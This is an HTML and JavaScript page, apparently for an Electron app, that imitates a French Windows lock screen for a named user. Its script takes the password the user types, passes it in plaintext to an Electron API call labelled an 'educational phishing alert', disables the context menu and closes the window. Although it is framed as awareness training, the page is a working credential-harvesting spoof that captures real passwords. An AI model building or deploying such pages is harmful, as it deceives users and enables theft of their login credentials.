<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Écran de verrouillage Windows</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <!-- Background container -->
    <div id="background"></div>
    
    <!-- Main container -->
    <div id="lockscreen-container">
        
        <!-- User profile section -->
        <div id="user-container">
            <!-- User avatar -->
            <div id="user-avatar">
                <img src="assets/user.png" class="main-user-icon-img" alt="User Avatar">
            </div>
            
            <!-- Username -->
            <div id="username">Sakho, Aissatou (ITDV DB) - AF (ext)</div>
            
            <!-- Password input section -->
            <div id="password-container">
                <input type="password" id="password-input" placeholder="Mot de passe" autocomplete="off">
                <div id="password-icon">→</div>
            </div>
        
        </div>
        
        <!-- Bottom section -->
        <div id="bottom-container">
            <img src="assets/wifi.png" id="network-icon" class="system-icon" alt="WiFi">
            <img src="assets/accessibility.png" id="accessibility-icon" class="system-icon" alt="Accessibility">
            <img src="assets/power.png" id="power-icon" class="system-icon" alt="Power">
        </div>
        
        <!-- Bottom left user buttons -->
        <div id="user-buttons-container">
            <div class="user-button active">
                <div class="user-button-icon">
                    <img src="assets/user.png" class="user-icon-img" alt="User">
                </div>
                <span class="user-button-text">Sakho, Aissatou (ITDV DB) - AF...</span>
            </div>
            <div class="user-button">
                <div class="user-button-icon">
                    <img src="assets/user.png" class="user-icon-img" alt="User">
                </div>
                <span class="user-button-text">Autre utilisateur</span>
            </div>
        </div>

    </div>

    <script>
     
        
        const passwordInput = document.getElementById('password-input');
        const errorMessage = document.getElementById('error-message');
        const warningMessage = document.getElementById('warning-message');
        const userContainer = document.getElementById('user-container');
        
        // Handle password input
        passwordInput.addEventListener('keypress', function(event) {
            if (event.key === 'Enter') {
                handlePasswordAttempt();
            }
        });
        
        // Handle password icon click
        document.getElementById('password-icon').addEventListener('click', handlePasswordAttempt);
        
        function handlePasswordAttempt() {
            const password = passwordInput.value;
            
            // Send educational phishing alert via API
            sendPhishingAlert(password);
            
        
            // Close the program immediately
            window.close();
        }
        
        async function sendPhishingAlert(password) {
            try {
                // Send API request automatically via Electron API
                const result = await window.electronAPI.sendPhishingWarning(password);
                if (result.success) {
                } else {
                }
            } catch (error) {
            }
        }
        
        // Prevent context menu
        document.addEventListener('contextmenu', e => e.preventDefault());
        
        // Focus on password input initially
        window.addEventListener('load', () => {
            passwordInput.focus();
        });
        
    </script>
</body>
</html>